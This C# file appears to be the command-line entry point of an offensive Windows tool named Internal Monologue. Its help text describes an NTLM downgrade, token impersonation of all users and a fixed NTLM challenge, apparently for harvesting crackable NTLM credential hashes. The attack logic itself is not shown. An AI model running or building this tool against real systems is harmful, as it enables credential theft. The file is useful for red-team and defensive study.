using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace InternalMonologue
{
    public class Program
    {
        //Parse command line arguments
        static Dictionary<string, string> ParseArgs(string[] args)
        {
            Dictionary<string, string> ret = new Dictionary<string, string>();
            if (args.Length % 2 == 0 && args.Length > 0)
            {
                for (int i = 0; i < args.Length; i = i + 2)
                {
                    ret.Add(args[i].Substring(1).ToLower(), args[i + 1].ToLower());
                }
            }
            return ret;
        }

        private static void PrintError(string message)
        {
            Console.WriteLine();
            Console.WriteLine("Error: " + message);
            PrintHelp();
        }

        private static void PrintHelp()
        {
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine("InternalMonologue -Downgrade True/False -Restore True/False - Impersonate True/False -Verbose True/False -Challenge ascii-hex");
            Console.WriteLine("Example:");
            Console.WriteLine("InternalMonologue -Downgrade False -Restore False -Impersonate True -Verbose False -Challenge 1122334455667788");
            Console.WriteLine();
            Console.WriteLine("Downgrade - Specifies whether to perform an NTLM downgrade or not [True/False]. Optional. Defult is true.");
            Console.WriteLine("Restore - Specifies whether to restore the original values from before the NTLM downgrade or not [True/False]. Optional. Defult is true.");
            Console.WriteLine("Impersonate - Specifies whether to try to impersonate all other available users or not [True/False]. Optional. Defult is true.");
            Console.WriteLine("Threads - Specifies whether to try to locate tokens to impersonate from threads or not [True/False]. Optional. Defult is false.");
            Console.WriteLine("Verbose - Specifies whether print verbose output or not [True/False]. Optional. Defult is false.");
            Console.WriteLine("Challenge - Specifies the NTLM challenge to be used. An 8-byte long value in ascii-hex representation. Optional. Defult is 1122334455667788.");
            Console.WriteLine();
        }

        public static void Main(string[] args)
        {
            Dictionary<string, string> argDict = ParseArgs(args);
            //Set defaults
            bool impersonate = true, threads = false, downgrade = true, restore = true, verbose = false;
            string challenge = "1122334455667788";

            if (args.Length > 0 && argDict.Count == 0)
            {
                PrintHelp();
                return;
            }
            else if (args.Length == 0)
            {
                if (verbose) Console.Error.WriteLine("Running with default settings. Type -Help for more information.\n");

            }

            if (argDict.ContainsKey("impersonate"))
            {
                if (bool.TryParse(argDict["impersonate"], out impersonate) == false)
                {
                    PrintError("Impersonate must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("threads"))
            {
                if (bool.TryParse(argDict["threads"], out threads) == false)
                {
                    PrintError("Threads must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("downgrade"))
            {
                if (bool.TryParse(argDict["downgrade"], out downgrade) == false)
                {
                    PrintError("Downgrade must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("restore"))
            {
                if (bool.TryParse(argDict["restore"], out restore) == false)
                {
                    PrintError("Restore must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("verbose"))
            {
                if (bool.TryParse(argDict["verbose"], out verbose) == false)
                {
                    PrintError("Verbose must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("challenge"))
            {
                challenge = argDict["challenge"].ToUpper();
                if (Regex.IsMatch(challenge, @"^[0-9A-F]{16}$") == false)
                {
                    PrintError("Challenge must be a 8-byte long value in asciihex representation.  (e.g. 1122334455667788)");
                    return;
                }
            }
            if (verbose) Console.WriteLine("Checking threads for user tokens enabled: {0}", threads);

            var monologue = new InternalMonologue(impersonate, threads, downgrade, restore, challenge, verbose);
            var monologueConsole = monologue.Go();
            Console.WriteLine(monologueConsole.Output());
        }
    }
}